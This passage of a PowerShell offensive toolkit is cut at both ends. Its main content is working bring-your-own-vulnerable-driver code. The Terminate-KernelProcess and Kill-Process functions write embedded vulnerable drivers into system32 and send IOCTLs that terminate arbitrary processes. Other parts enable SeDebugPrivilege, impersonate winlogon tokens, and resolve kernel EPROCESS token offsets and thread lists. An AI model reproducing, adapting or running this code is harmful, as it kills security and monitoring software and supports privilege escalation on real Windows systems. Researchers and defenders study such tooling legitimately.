            if ($CurrentImportDescriptorOffset -ge $FileByteArray.Length) { break }

            $DescriptorPtr = [IntPtr]($PEBaseAddr.ToInt64() + $CurrentImportDescriptorOffset)
            $ImportDescriptor = [Marshal]::PtrToStructure($DescriptorPtr, [Type][PE+_IMAGE_IMPORT_DESCRIPTOR])

            # End of Import Table marker
            if ($ImportDescriptor.Characteristics -eq 0 -and $ImportDescriptor.Name -eq 0 -and $ImportDescriptor.FirstThunk -eq 0) {
                break
            }
            if ($ImportDescriptor.Name -eq 0) { break }

            # Resolve dependent DLL name
            $NameRva = [int64][uint32]$ImportDescriptor.Name
            $ImportedDllNameOffset = Convert-RVAToFileOffset -Rva $NameRva -SectionHeaders $SectionHeaders
            $ImportedDllName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $ImportedDllNameOffset))

            # FIX: Explicitly check OriginalFirstThunk (Characteristics). If 0, use FirstThunk.
            # This protects against reading garbage metadata strings outside the IAT.
            $ThunkRVA = [int64][uint32]$ImportDescriptor.Characteristics
            if ($ThunkRVA -eq 0) {
                $ThunkRVA = [int64][uint32]$ImportDescriptor.FirstThunk
            }

            if ($ThunkRVA -eq 0) {
                $CurrentImportDescriptorOffset += $DescriptorSize
                continue
            }

            $ThunkOffset = Convert-RVAToFileOffset -Rva $ThunkRVA -SectionHeaders $SectionHeaders
            $ThunkSize = if ($Is64Bit) { 8 } else { 4 }
            $CurrentThunkOffset = $ThunkOffset

            # Inner loop: Collect functions for this module block
            while ($true) {
                if ($CurrentThunkOffset -ge $FileByteArray.Length) { break }

                $ThunkValue = if ($Is64Bit) {
                    [Marshal]::ReadInt64([IntPtr]($PEBaseAddr.ToInt64() + $CurrentThunkOffset))
                } else {
                    [Marshal]::ReadInt32([IntPtr]($PEBaseAddr.ToInt64() + $CurrentThunkOffset))
                }

                if ($ThunkValue -eq 0) { break }

                # Check if imported by Ordinal vs Named String
                $OrdinalBitMask = if ($Is64Bit) { [Int64]::MinValue } else { [Int32]::MinValue }
                if (($ThunkValue -band $OrdinalBitMask) -eq 0) {
                    
                    $SafeRva = [int64]($ThunkValue -band 0x7FFFFFFF)
                    $NameStructOffset = Convert-RVAToFileOffset -Rva $SafeRva -SectionHeaders $SectionHeaders
                    
                    if ($NameStructOffset -lt $FileByteArray.Length) {
                        # +2 skips the structural Hint word inside the IMAGE_IMPORT_BY_NAME record
                        $ImportedFuncName = [Marshal]::PtrToStringAnsi([IntPtr]($PEBaseAddr.ToInt64() + $NameStructOffset + 2))

                        if (-not [string]::IsNullOrEmpty($ImportedFuncName)) {
                            $ImportList.Add([PSCustomObject]@{
                                ImportedFunction = $ImportedFuncName
                                SourceModule     = $ImportedDllName
                                ImportType       = "Name"
                            })
                        }
                    }
                } else {
                    $OrdinalValue = $ThunkValue -band 0xFFFF
                    $ImportList.Add([PSCustomObject]@{
                        ImportedFunction = "Ordinal_$OrdinalValue"
                        SourceModule     = $ImportedDllName
                        ImportType       = "Ordinal"
                    })
                }

                $CurrentThunkOffset += $ThunkSize
            }

            $CurrentImportDescriptorOffset += $DescriptorSize
        }

        return $ImportList

    } finally {
        if ($Handle -and $Handle.IsAllocated) {
            $Handle.Free()
        }
    }
}
function Get-DriverAddress {
    param (
        [string]$DriverName
    )

    [Int32]$sz = 0
    $structSize = 272
    if ($NtApi::RtlQueryModuleInformation([ref]$sz, $structSize, [IntPtr]::Zero) -eq 0 -and $sz -gt 0) {
        $buf = [Marshal]::AllocHGlobal($sz)   
        if ($NtApi::RtlQueryModuleInformation([ref]$sz, $structSize, $buf) -eq 0) {       
            $moduleCount = $sz / $structSize
            for ($i = 0; $i -lt $moduleCount; $i++) {

                # Calculate the starting point of the current module structure
                $currentPtr = [IntPtr]([Int64]$buf + ($i * $structSize))

                # Offset 0: Image Base Address
                $imageBase = [Marshal]::ReadIntPtr($currentPtr, 0)

                # Offset 16: Image Name String (Null-terminated ASCII)
                $namePtr = [IntPtr]([Int64]$currentPtr + 16)
                $imageName = [Marshal]::PtrToStringAnsi($namePtr)

                # Check if this module is CI.dll
                if ($imageName -like "*$DriverName*") {
                   #Write-Warning "FOund Image Name $imageName"
                    return $imageBase
                }
            }
        }
        [Marshal]::FreeHGlobal($buf)
    }
    throw "Could not retrieve runtime kernel base address for $DriverName"
}
#endregion
#region Process
function Invoke-MemoryRead {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [int]$ProcessId,

        [Parameter(Mandatory = $true)]
        [IntPtr]$Address,

        [Parameter(Mandatory = $false)]
        [int]$BytesToRead = 32
    )

    # 1. Define the Win32 API layer dynamically via Reflection.Emit if it doesn't exist
    try {
        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.ScopeName -eq "Win32Api" } | Select-Object -Last 1
        $Win32Api = $Module.GetTypes()[0]
    }
    catch {
        # Choke pipeline output by assigning assembly components or using [void]
        $AssemblyName = New-Object System.Reflection.AssemblyName("null")
        $DynamicAssembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly($AssemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $Module = $DynamicAssembly.DefineDynamicModule("Win32Api", $false).DefineType("null")
    
        @(
            @('OpenProcess', 'kernel32.dll', [IntPtr], @([UInt32], [Boolean], [Int32])),
            @('ReadProcessMemory', 'kernel32.dll', [Boolean], @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr].MakeByRefType())),
            @('CloseHandle', 'kernel32.dll', [Boolean], @([IntPtr]))
        ) | ForEach-Object {
            [void]$Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
        }
        $Win32Api = $Module.CreateType()
    }

    # --- Execute Read Operation ---
    $ProcessHandle = $Win32Api::OpenProcess(0x0010, $false, $ProcessId)

    if ($ProcessHandle -ne [IntPtr]::Zero) {
        $LocalBuffer = New-Object byte[] $BytesToRead
        $BytesRead = [IntPtr]::Zero

        $Success = $Win32Api::ReadProcessMemory($ProcessHandle, $Address, $LocalBuffer, $BytesToRead, [ref]$BytesRead)

        # Choke the boolean output of CloseHandle
        [void]$Win32Api::CloseHandle($ProcessHandle)

        if ($Success) {
            return ,$LocalBuffer
        }
    }
}
function Read-ProcessMemory {
    [CmdletBinding()]
    param (
        [int]$ProcessID = 0,
        [int32]$Offset = 0,
        [int32]$BytesToRead = 1024,
        [switch]$OutHex
    )

    process {
        if ($ProcessID -le 0) {
            $ProcessID = [marshal]::ReadInt64((NtCurrentTeb -ClientID))
        }

        if ($Offset -lt 0) {
            throw "Offset can be Negative"
        }

        Adjust-TokenPrivileges -Privilege SeDebugPrivilege | Out-Null
        
        $PebBaseAddress = Query-Process -ProcessId $ProcessId -First | Select-Object -ExpandProperty PebBaseAddress
        $ImageBasePointerLocation = [IntPtr]::Add([IntPtr]$PebBaseAddress, 0x10)

        $PointerBytes = Invoke-MemoryRead -ProcessId $ProcessId -Address $ImageBasePointerLocation -BytesToRead 8
        if ($null -eq $PointerBytes) { return $null }
        
        $RawIntAddress = [System.BitConverter]::ToInt64($PointerBytes, 0)
        $FinalData = Invoke-MemoryRead -ProcessId $ProcessId -Address ([IntPtr]::Add($RawIntAddress, $Offset)) -BytesToRead $BytesToRead
        
        if ($null -eq $FinalData) {
            Write-Warning "Hex view buffer is empty."
            return
        }

        if ($OutHex.IsPresent) {
            return $FinalData | Format-HexView -Mode 16x
        } else {
            return $FinalData
        }
    }
}
Function Get-KernelThreadList {
    Param(
        [Int32]$ProcessID = 0
    )

    # 1. Resolve Target PID if default (0) was provided
    if ($ProcessID -le 0) {
        $ProcessID = [marshal]::ReadInt64((NtCurrentTeb -ClientID))
    }

    # 2. Extract Target Process Base Pointer
    $TargetEprocess = Query-EprocessStruct -ProcessID $ProcessID

    if ($TargetEprocess -ne 0 -and $Global:ThreadListEntryOffset -ne $null) {
        
        # Extract the Process Name from the ImageFileName offset
        $NameBuffer = New-Object Byte[] 15
        $NamePtr = [IntPtr]::Add($TargetEprocess, $Global:ImageFileNameOffset)
        $NameBuffer = Read-VirtualAddress -VA $NamePtr -BlockSize 15
        $ProcessName = [System.Text.Encoding]::ASCII.GetString($NameBuffer).Trim("`0")

        $ThreadListHeadAddr = [IntPtr]::Add($TargetEprocess, $Global:ThreadListHeadOffset)
        $CurrentFlink = Read-VirtualAddress -VA $ThreadListHeadAddr -AsLong
        
        $ThreadList = [System.Collections.Generic.List[PSCustomObject]]::new()
        $LoopGuard = 0

        # Track the oldest thread to find the main thread
        $OldestTime = [UInt64]::MaxValue
        $MainThreadIndex = -1

        # Walk the circular linked list until it loops back to the head address
        while ($CurrentFlink -ne $ThreadListHeadAddr -and $CurrentFlink -ne 0 -and $LoopGuard -lt 100) {
            $LoopGuard++
            $PETHREAD_Base = $CurrentFlink - $Global:ThreadListEntryOffset

            # 1. Read the Thread ID dynamically
            $DynamicUniqueThreadOffset = $Global:CreateTimeOffset + 0x48 + 0x08
            $CidUniqueThreadPtr = [IntPtr]::Add($PETHREAD_Base, $DynamicUniqueThreadOffset)
            $ThreadID = Read-VirtualAddress -VA $CidUniqueThreadPtr -AsLong

            # 2. Read the CreateTime dynamically (8-byte LARGE_INTEGER)
            $CreateTimePtr = [IntPtr]::Add($PETHREAD_Base, $Global:CreateTimeOffset)
            $CreateTimeValue = Read-VirtualAddress -VA $CreateTimePtr -AsLong

            # Track the oldest thread (lowest timestamp value > 0)
            if ($CreateTimeValue -gt 0 -and $CreateTimeValue -lt $OldestTime) {
                $OldestTime = $CreateTimeValue
                $MainThreadIndex = $LoopGuard - 1 # Zero-based index matching the array
            }

            # 3. Read the PreviousMode Byte
            $PrevModePtr = [IntPtr]::Add($PETHREAD_Base, $Global:PreviousModeOffset)
            $PreviousModeByte = Read-VirtualAddress -VA $PrevModePtr -AsByte
            $ModeDesc = if ($PreviousModeByte -eq 0) { "0 (KernelMode)" } else { "1 (UserMode)" }

            # Add collected thread structure properties to our list
            $ThreadList.Add([PSCustomObject]@{
                Index            = $LoopGuard
                ProcessName      = $ProcessName
                PETHREAD_Address = "0x{0:X}" -f $PETHREAD_Base
                ThreadID         = $ThreadID
                IsMainThread     = $false   # Will flag this after the loop completes
                PreviousMode     = $ModeDesc
                PreviousAddress  = "0x{0:X}" -f $PrevModePtr.ToInt64()
                Flink_Pointer    = "0x{0:X}" -f $CurrentFlink
                CreateTimeRaw    = $CreateTimeValue
                CreateTimeValue  = [DateTime]::FromFileTime($CreateTimeValue).ToString("dd/MM/yyyy HH:mm:ss.fff")
            })

            # Advance to the next Flink pointer inside the list chain
            $CurrentFlink = Read-VirtualAddress -VA $CurrentFlink -AsLong
        }

        # If we found the oldest thread, tag it as the main thread
        if ($MainThreadIndex -ge 0) {
            $ThreadList[$MainThreadIndex].IsMainThread = $true
            $MainID = $ThreadList[$MainThreadIndex].ThreadID
            Write-Output "[+] Identified Main Thread ID: $MainID (Index: $($MainThreadIndex + 1))"
            Write-Output "--------------------------------------------------------------------------------"
        }

        # Print out the perfectly aligned thread table
        $ThreadList | Format-Table -AutoSize

    } else {
        Write-Error "[-] Failed to resolve a valid kernel memory pointer for target process."
    }
}
function Terminate-KernelProcess {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [Int32]$ProcID,

        [Parameter(Mandatory = $false, Position = 1)]
        [ValidateSet("All", "HWAuidoOs2Ec", "STProcessMonitorDriver", "wamsdk", "d591004", "ProcessCtr", "GGProtect64", "ksapi", "CcProtect", "EnPortv", "xkpsm")]
        [String]$Driver = "All"
    )

    $DriverProfiles = @(
        @{
            FileName     = "HWAuidoOs2Ec"
            Alternative  = "HWAudioDevX64"
            Symbolic     = "Device"
            IoctlCode    = 0x2248DC
            InputSize    = 4
            OutputSize   = 4
            RequiresSys  = $false
            IoPattern    = "Standard"
            BlockName    = "HWAuid"
        },
        @{
            FileName     = "STProcessMonitorDriver"
            Alternative  = $null
            Symbolic     = $null
            IoctlCode    = 0xB822A00C
            InputSize    = 8
            OutputSize   = 0
            RequiresSys  = $true
            IoPattern    = "Standard"
            BlockName    = "STProcMon"
        },
        @{
            FileName     = "wamsdk"
            Alternative  = "amsdk"
            Symbolic     = $null
            IoctlCode    = 0x80002048
            InputSize    = 96
            OutputSize   = 96
            RequiresSys  = $false
            IoPattern    = "WamsdkSpecial"
            BlockName    = "wamsdk"
        },
        @{
            FileName     = "d591004"
            Alternative  = 'd591004'
            Symbolic     = $null
            IoctlCode    = 0x22201C
            InputSize    = 4
            OutputSize   = 8
            RequiresSys  = $false
            IoPattern    = "DirectOut"
            BlockName    = "d591004"
        },
        @{
            FileName     = "ProcessCtr"
            Alternative  = "ProcessCtr"
            Symbolic     = "Device"
            IoctlCode    = 0x89DB202C
            InputSize    = 4
            OutputSize   = 4
            RequiresSys  = $false
            BlockName    = "ProcessCtr"
        },
        @{
            FileName     = "GGProtect64"
            Alternative  = "GGProtect64"
            IoctlCode    = 0x223C04
            InputSize    = 4
            OutputSize   = 4
            RequiresSys  = $false
            IoPattern    = "GGSpecial"
            BlockName    = "GGProtect"
        }, @{
            FileName     = "ksapi"
            Alternative  = "ksapi64_dev"
            Symbolic     = "Device"
            IoctlCode    = 0x222440
            InputSize    = 4    # Changed from 8
            OutputSize   = 4    # Correct
            RequiresSys  = $false
            IoPattern    = "DirectOut"
            BlockName    = "ksapi"
        },
        @{
            # __int64 __fastcall sub_129B4(__int64 a1, __int64 a2)
            # unk_1E320
            # .data:000000000001E4F0                 dq offset aKillproc     ; "KillProc"
            # .data:000000000001E4F8                 dq offset sub_12118

            FileName     = "EnPortv"
            Alternative  = "EnPortv"
            IoPattern    = "EnPortvSpecial"
            BlockName    = "EnPortv"
        }, 
        @{
            # __int64 __fastcall sub_1A528(__int64 a1, IRP *a2)
            # v26 = sub_14930(v25);

            FileName     = "CcProtect"
            Alternative  = "CcProtect"
            Symbolic     = "Device"
            IoctlCode    = 2236452
            InputSize    = 4
            RequiresSys  = $false
            BlockName    = "CcProtect"
        },
        , 
        @{
            FileName     = "xkpsm"
            Alternative  = "xkpsm"
            Symbolic     = "Device"
            IoctlCode    = 0x8505E008
            InputSize    = 8
            RequiresSys  = $false
            BlockName    = "xkpsm"
        }
    )

    $TargetProfiles = $DriverProfiles
    if ($Driver -ne "All") {
        $TargetProfiles = $DriverProfiles | Where-Object { $_.FileName -eq $Driver }
    }

    foreach ($Profile in $TargetProfiles) {
        $DriverName = $Profile.FileName
        $SysFilePath = "C:\windows\system32\$DriverName.sys"
        if (-not (Test-Path $SysFilePath)) {
            Import-EmbeddedBlock -BlockName $Profile.BlockName -OutPath $SysFilePath | Out-Null
        }
        
        # [Standard Extraction & Service Verification Logic Remains Here]

        if ($Profile.RequiresSys) { Impersonate-Token -ProcessName winlogon }

        if ($DriverName -eq 'd591004') {
            $hDevice = Get-FileHandle -FileName $Profile.FileName | Out-Null
            $ExtractAlt = $null
            try {
                $ExtractAlt = (Get-ObjectManagerDirectory -Path Device | Where-Object { $_.Path -match '\\Device\\[1-9a-fA-F][0-9a-fA-F]{7}$' } | Select-Object -ExpandProperty Path) | Split-Path -Leaf
            } catch {}
            if ($ExtractAlt) {
                $hDevice = Get-FileHandle -FileName 'd591004' -AlternativeName $ExtractAlt -Symbolic 'Device'
            }
        } elseif ($DriverName -eq 'ksapi') {
            try {
                $BuildNumber = (Get-NtBuildNumber).BuildNumber
                Set-NtBuildNumber -NewBuildNumber 0x3FAB
                $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative -Symbolic $Profile.Symbolic
                Set-NtBuildNumber -NewBuildNumber $BuildNumber
            } catch {}
            
        } else {
            try {
                $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative
            } catch {}
            if ($hDevice -eq $null -or $hDevice -eq 0) {
                try {
                    $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative -Symbolic $Profile.Symbolic
                } catch {}
            }
        }
        if ($hDevice -eq $null -or $hDevice -eq 0) { continue }    

        $InOutPtr = $null
        $OutRet   = $null

        try {
            $Status = $false

            # ROUTER PATTERN 1: WAMSDK SPECIAL TWO-STAGE ALIGNMENT
            if ($Profile.IoPattern -eq "WamsdkSpecial") {

                # Setup 96-byte buffers matching standalone requirements
                $ClientPID = [Int32][Marshal]::ReadIntPtr((NtCurrentTeb -ClientID))
                $InOutPtr  = New-IntPtr -Size 96 -InitialValue $ClientPID
                $OutRet    = New-IntPtr -Size 96

                # Stage 1: Registration (Enforce strict 4-byte limits matching working test)
                $Stage1 = $NtApi::DeviceIoControl($hDevice, 0x80002010, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)
                
                if ($Stage1) {
                    # Stage 2: Align payload structure data exactly to working offsets
                    [marshal]::WriteInt64($InOutPtr, 0x0, 0L)
                    [marshal]::WriteInt32($InOutPtr, 0x0, $ProcID)
                    [marshal]::WriteInt32($InOutPtr, 0x4, 1)

                    # Dispatch final execution call
                    $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)
                }

            } elseif ($Profile.IoPattern -eq "GGSpecial") {

                # https://github.com/The-Sword-of-Constantine/UsingBYOVD
                
                $CurrentPID   = [Int32][Marshal]::ReadIntPtr((NtCurrentTeb -ClientID))
                $HandshakePtr = New-IntPtr -Size 4 -InitialValue ($CurrentPID -bxor 0x5A84)
                $dwRead = [Marshal]::AllocHGlobal(4)
                try {
                    if (-not $NtApi::DeviceIoControl($hDevice, 0x223C14, $HandshakePtr, 4, [IntPtr]::Zero, 0, $dwRead, [IntPtr]::Zero)) {
                        throw "GG Handshake Fail"
                    }
                } finally {
                    Free-IntPtr $dwRead
                    Free-IntPtr $HandshakePtr
                }

                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
                $OutRet   = New-IntPtr -Size 8
                
                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, [IntPtr]::Zero, 0, $OutRet, [IntPtr]::Zero)
                
                # Unload this crap
                $UnloadPtr = New-IntPtr -Size 4 -InitialValue ($CurrentPID -bxor 0x5A84)
                $dwRead    = [Marshal]::AllocHGlobal(4)
                try {
                    # Trigger clean internal unhooking (sub_14000D300)
                    $NtApi::DeviceIoControl($hDevice, 0x223C1C, $UnloadPtr, 4, [IntPtr]::Zero, 0, $dwRead, [IntPtr]::Zero) | Out-Null
                } finally {
                    Free-IntPtr $dwRead
                    Free-IntPtr $UnloadPtr
                }

            } elseif ($Profile.IoPattern -eq "EnPortvSpecial") {

                # Allocating the full space needed (Header + Payload)
                $InOutPtr = New-IntPtr -Size 16  
                $OutRet   = New-IntPtr -Size 8

                # Write your Process ID starting at byte offset 8
                $cProcID = [marshal]::ReadInt64((NtCurrentTeb -ClientID))
                [marshal]::WriteInt64($InOutPtr, 0, $cProcID)
                [marshal]::WriteInt64($InOutPtr, 8, $ProcID)

                # The function call expects the TOTAL size of the allocated buffer
                $Status = $NtApi::DeviceIoControl(
                    $hDevice, 
                    2240632, 
                    $InOutPtr, 16,
                    [IntPtr]::Zero, 0,
                    $OutRet, [IntPtr]::Zero
                )

            } elseif ($Profile.IoPattern -eq "DirectOut") {

                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
                $OutRet   = New-IntPtr -Size $Profile.OutputSize # 8 bytes allocated

                # Route OutRet into lpOutBuffer slot with nOutBufferSize explicitly set to 0
                $pBytesReturned = New-IntPtr -Size 8
                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, $OutRet, $Profile.OutputSize, $pBytesReturned, [IntPtr]::Zero)
                Free-IntPtr $pBytesReturned

            } else {

                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
                $OutRet   = New-IntPtr -Size 8
                
                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, [IntPtr]::Zero, 0, $OutRet, [IntPtr]::Zero)
            }

            if ($Status) {
                Write-Host "[SUCCESS] Terminated PID $ProcID via $($Profile.FileName)." -ForegroundColor Green
                return
            } else {
                Write-Warning "DeviceIoControl signaling failed for driver: $DriverName"
            }

        } catch {
            Write-Warning "Exception encountered: $_"
        } finally {
            if ($InOutPtr) { Free-IntPtr -handle $InOutPtr }
            if ($OutRet)   { Free-IntPtr -handle $OutRet }
            if ($hDevice)  { Free-IntPtr -handle $hDevice -Method NtHandle }
            if ($Profile.RequiresSys) { Impersonate-Token -Revert }
        }
    }
}
Function Kill-Process {
    param (
        [Int32]$ProcessID,
        [ValidateSet("BdApiUtil", "bootrepair", "GoFly", "wsftprm", "PoisonX")]
        [String]$DriverName
    )

    switch ($DriverName) {
        "BdApiUtil"  { 
            if (-not [File]::Exists("C:\windows\system32\BdApiUtil.sys")) {
                Import-EmbeddedBlock -BlockName BdApiUtil -OutPath 'C:\windows\system32\BdApiUtil.sys' | Out-Null
            }
        }
        "GoFly"      {
            if (-not [File]::Exists("C:\windows\system32\GoFly64.sys")) {
                Import-EmbeddedBlock -BlockName GoFly -OutPath 'C:\windows\system32\GoFly64.sys' | Out-Null
            }
        }
        "bootrepair" {
            if (-not [File]::Exists("C:\windows\system32\BootRepair.sys")) {
                Import-EmbeddedBlock -BlockName BootRepair -OutPath 'C:\windows\system32\BootRepair.sys' | Out-Null
            }
        }
        "wsftprm"    {
            if (-not [File]::Exists("C:\windows\system32\wsftprm.sys")) {
                Import-EmbeddedBlock -BlockName wsftprm -OutPath 'C:\windows\system32\wsftprm.sys' | Out-Null
            }
        }
        "PoisonX"    {
            if (-not [File]::Exists("C:\windows\system32\PoisonX.sys")) {
                Import-EmbeddedBlock -BlockName PoisonX -OutPath 'C:\windows\system32\PoisonX.sys' | Out-Null
            }
        }
    }

    $IOCTL = 0x0
    $OutBuffer = [IntPtr]::Zero
    $OutBufferSize = 0x00

    switch ($DriverName) {
      "BdApiUtil"  { $IOCTL = 0x800024B4 }
      "GoFly"      { $IOCTL =  0x12227A  }
      "bootrepair" { $IOCTL =  0x222014  }
      "wsftprm"    { $IOCTL =  0x22201C  }
      "PoisonX"    { $IOCTL =  0x22E010  }
    }

    if ($DriverName -eq 'wsftprm') {
        $DataSize = 0x40C
        $DataPtr  = New-IntPtr -Size 0x40C -InitialValue $ProcessID
        $Handle   = Get-FileHandle -FileName $DriverName -AlternativeName 'Warsaw_PM'
    } elseif ($DriverName -eq 'PoisonX') {
        $ProcessStr = $ProcessID.ToString()
        $DataBytes  = [Encoding]::ASCII.GetBytes($ProcessStr)
        # ~~~~~~~~~~~
        $DataSize = 16
        $DataPtr  = [Marshal]::AllocHGlobal(16)
        0..1 | % {[Marshal]::WriteInt64($DataPtr, ($_*0x8), 0L)}
        $CopyLength = [Math]::Min($DataBytes.Length, $DataSize - 1)
        [Marshal]::Copy($DataBytes, 0, $DataPtr, $CopyLength)
        # ~~~~~~~~~~~
        $Handle   = Get-FileHandle -FileName 'PoisonX' -AlternativeName "{F8284233-48F4-4680-ADDD-F8284233}"
        # ~~~~~~~~~~~
        $OutBuffer = $DataPtr
        $OutBufferSize = $DataSize
    } elseif ($DriverName -eq 'GoFly') {
        $DataSize = 0x04
        $DataPtr  = New-IntPtr -Size 0x04 -InitialValue $ProcessID
        $Handle   = Get-FileHandle -FileName 'GoFly64' -AlternativeName $DriverName
    } else {
        $DataSize = 0x04
        $DataPtr  = New-IntPtr -Size 0x04 -InitialValue $ProcessID
        $Handle   = Get-FileHandle -FileName $DriverName
    }

    try {
        return (
            $NtApi::DeviceIoControl(
                $Handle,     $IOCTL,
                $DataPtr,    $DataSize,
                $OutBuffer,  $OutBufferSize,
                [IntPtr]::Zero, 
                [IntPtr]::Zero
            )
        )
    }
    finally {
        Free-IntPtr $DataPtr
        Free-IntPtr -handle $Handle -Method NtHandle
    }
}
Function Query-EprocessStruct {
    Param(
        [Int32]$ProcessID = 0
    )
    
    $Global:KernelAddress = Get-KernelBaseAddress
    $global:hModule       = Ldr-LoadDll -dwFlags SEARCH_SYS32 -dll ntoskrnl.exe

    # Automatically resolve offsets based on your Token matrix timeline
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    # ntoskrnl.exe, IDA, Local Types, _EPROCESS
    # https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_EPROCESS
    # https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm

    if ($null -eq $Global:TokenOffset) {
        $OS = [Environment]::OSVersion.Version
        $Build = $OS.Build

        # Match OS Major.Minor versions to your offset list
        $Global:TokenOffset = switch ($OS.Major) {
            5 { 
                if ($OS.Minor -eq 2) { 0x0160 } else { 0x0160 } # Windows XP x64 / Server 2003
            }
            6 { 
                switch ($OS.Minor) {
                    0 { 0x0168 } # Windows Vista / Server 2008
                    1 { 0x0208 } # Windows 7 / Server 2008 R2
                    Default { 0x0348 } # Windows 8 (6.2) and Windows 8.1 (6.3)
                }
            }
            10 {
                # Windows 10 & 11 branch based on Build Numbers
                if ($Build -le 17763) { 0x0358 }     # 10.0 Base up to Redstone 5 (1809)
                elseif ($Build -le 18363) { 0x0360 }   # 1903 and 1909
                elseif ($Build -le 19045) { 0x04B8 }   # 20H1 up to Windows 10 22H2 / Early Win 11
                elseif ($Build -ge 26100) { 0x0248 }   # Windows 11 24H2 and newer architecture
                else { 0x04B8 }                        # Fallback case for interim 11 builds
            }
            Default { 0x04B8 } # Ultimate fallback for modern kernels
        }
    }

    if ($null -eq $Global:SystemProcessOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        $AnsiPtr = Init-NativeString -Value 'PsInitialSystemProcess' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr
        if($ProcedureAddress -ne 0L) {
            $Global:SystemProcessOffset = [Int64]($ProcedureAddress - $hModule.ToInt64())
        }
    }

    # 2. Run your dynamic script block again
    if ($null -eq $Global:ThreadListEntryOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        $AnsiPtr = Init-NativeString -Value 'PsGetThreadCreateTime' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            $FuncBytes = New-Object Byte[] 16
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)
        
            for ($i = 0; $i -lt 12; $i++) {
                # Catch BOTH: 48 8B 81 XX XX XX XX (mov rax) OR 8B 81 XX XX XX XX (mov eax)
                if (($FuncBytes[$i] -eq 0x48 -and $FuncBytes[$i+1] -eq 0x8B -and $FuncBytes[$i+2] -eq 0x81) -or 
                    ($FuncBytes[$i] -eq 0x8B -and $FuncBytes[$i+1] -eq 0x81)) {
                
                    # Determine where the 4-byte displacement actually starts
                    $OffsetStep = if ($FuncBytes[$i] -eq 0x48) { 3 } else { 2 }
                
                    $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + $OffsetStep)
                    $Global:CreateTimeOffset = [Marshal]::ReadInt32($TargetAddress)
                
                    # Apply your absolute structural invariant delta
                    $Global:ThreadListEntryOffset = $Global:CreateTimeOffset + 0xB8
                    break
                }
            }
        }
    }

    if ($null -eq $Global:ActiveOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        $AnsiPtr = Init-NativeString -Value 'PsGetProcessId' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            # Read the first 16 bytes of the function into a managed byte array
            $FuncBytes = New-Object Byte[] 16
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)

            $UniqueProcessIdOffset = 0
        
            # Scan for '48 8B 81' (mov rax, [rcx + offset]) or '48 8B 91' (mov rax, [rdx + offset])
            for ($i = 0; $i -lt 12; $i++) {
                if ($FuncBytes[$i] -eq 0x48 -and $FuncBytes[$i+1] -eq 0x8B -and ($FuncBytes[$i+2] -eq 0x81 -or $FuncBytes[$i+2] -eq 0x91)) {
                    # The 4-byte offset immediately follows the 3-byte opcode
                    $TargetAddress = [IntPtr]::Add($ProcedureAddress, $i + 3)
                    $UniqueProcessIdOffset = [Marshal]::ReadInt32($TargetAddress)
                    break
                }
            }

            if ($UniqueProcessIdOffset -gt 0) {
                $Global:ActiveOffset = $UniqueProcessIdOffset + 0x08
            } else {
                # Fallback if pattern scan fails
                $Global:ActiveOffset = 0x448
            }
        } else {
            $Global:ActiveOffset = 0x448
        }
    }

    if ($null -eq $Global:PEBOffset) {
        $ProcedureAddress = [IntPtr]::Zero
        $AnsiPtr = Init-NativeString -Value 'PsGetProcessPeb' -Encoding Ansi
        $Global:ntdll::LdrGetProcedureAddressForCaller($hModule, $AnsiPtr, 0, [ref]$ProcedureAddress, 0, 0) | Out-Null
        Free-NativeString -StringPtr $AnsiPtr

        if ($ProcedureAddress -ne 0L) {
            $FuncBytes = New-Object Byte[] 16
            [Marshal]::Copy($ProcedureAddress, $FuncBytes, 0, 16)
            if ($FuncBytes[0] -eq 0x48 -and $FuncBytes[1] -eq 0x8B -and $FuncBytes[2] -eq 0x81) {
                $Global:PEBOffset = [System.BitConverter]::ToUInt32($FuncBytes, 3)
